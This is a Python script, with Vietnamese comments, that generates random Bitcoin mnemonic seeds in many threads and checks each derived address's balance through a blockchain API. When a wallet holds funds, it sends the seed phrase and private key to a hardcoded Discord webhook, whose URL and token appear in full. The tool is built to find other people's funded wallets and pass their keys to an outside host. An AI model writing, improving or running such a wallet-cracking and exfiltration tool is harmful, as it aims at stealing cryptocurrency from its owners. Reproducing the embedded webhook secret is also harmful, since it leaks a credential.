import curses
from mnemonic import Mnemonic
import bip32utils
import requests
import threading

# Biến toàn cục để đếm số lượng ví
total_wallets_checked = 0
total_wallets_checked_lock = threading.Lock()

def get_balance(Wallet_Address):
    url = f"https://api.blockchain.info/haskoin-store/btc/address/{Wallet_Address}/balance"
    response = requests.get(url)
    
    if response.status_code == 200:
        balance = response.json()
        return balance
    else:
        print(f"Error fetching balance: {response.status_code}")
        return None

def send_discord_message(webhook_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, json=data, headers=headers)
    return response.status_code, response.text

def generate_wallet_and_check_balance(webhook_url, stdscr):
    global total_wallets_checked
    mnemon = Mnemonic('english')

    while True:
        # Tạo ví Bitcoin
        words = mnemon.generate(strength=128)
        mnemon.check(words)
        seed = mnemon.to_seed(words)

        root_key = bip32utils.BIP32Key.fromEntropy(seed)
        address = root_key.Address()
        public_key = root_key.PublicKey().hex()
        private_key = root_key.WalletImportFormat()

        # Lấy số dư
        balance_data = get_balance(address)
        if balance_data is not None:
            confirmed_balance_satoshi = balance_data['confirmed']
            confirmed_balance_btc = confirmed_balance_satoshi / 100000000  # Chuyển đổi từ satoshi sang BTC
            print(confirmed_balance_satoshi)
        else:
            confirmed_balance_btc = 0.0

        # Cập nhật tổng số ví đã kiểm tra
        with total_wallets_checked_lock:
            total_wallets_checked += 1

        # In kết quả ra màn hình
        wallet_info = (
            f'Wallet:\n'
            f'Seed: {words}\n'
            f'Address: {address}\n'
            f'Public Key: {public_key}\n'
            f'Private Key: {private_key}\n'
            f"Bitcoin Balance: {confirmed_balance_btc:.8f} BTC\n"
        )
        print(wallet_info)

        # Cập nhật hiển thị curses
        stdscr.clear()
        stdscr.addstr(0, 0, f'Total wallets checked: {total_wallets_checked}')
        stdscr.addstr(2, 0, wallet_info)
        stdscr.refresh()

        # Chỉ gửi thông điệp nếu số dư lớn hơn 0.00000001 BTC
        if confirmed_balance_btc > 0.00000001:
            message = (
                f"====================\n"
                f"Wallet Information:\n"
                f"Seed: {words}\n"
                f"Address: {address}\n"
                f"Public Key: {public_key}\n"
                f"Private Key: {private_key}\n"
                f"Bitcoin Balance: {confirmed_balance_btc:.8f} BTC\n"
                f"====================\n"
            )

            status_code, response_text = send_discord_message(webhook_url, message)
            print(f"Discord response: {status_code} - {response_text}")

def get_num_threads(stdscr):
    stdscr.clear()
    stdscr.addstr(0, 0, "Nhập số lượng luồng bạn muốn chạy: ")
    stdscr.refresh()
    curses.echo()  # Cho phép hiển thị những gì người dùng gõ
    num_threads = stdscr.getstr(1, 0).decode()  # Nhập số liệu từ người dùng
    curses.noecho()  # Tắt hiển thị những gì người dùng gõ
    return int(num_threads)

def main(stdscr):
    curses.curs_set(0)  # Tắt con trỏ hiển thị
    num_threads = get_num_threads(stdscr)
    webhook_url = 'https://discord.com/api/webhooks/1244663370502639757/SkDoqSBD9J2vUQI-SFP7c2hmUMdatwDWLJzY7vkW2vK1nMHSaqh9tGQ70ejisdgVgSmC'

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=generate_wallet_and_check_balance, args=(webhook_url, stdscr))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    curses.wrapper(main)
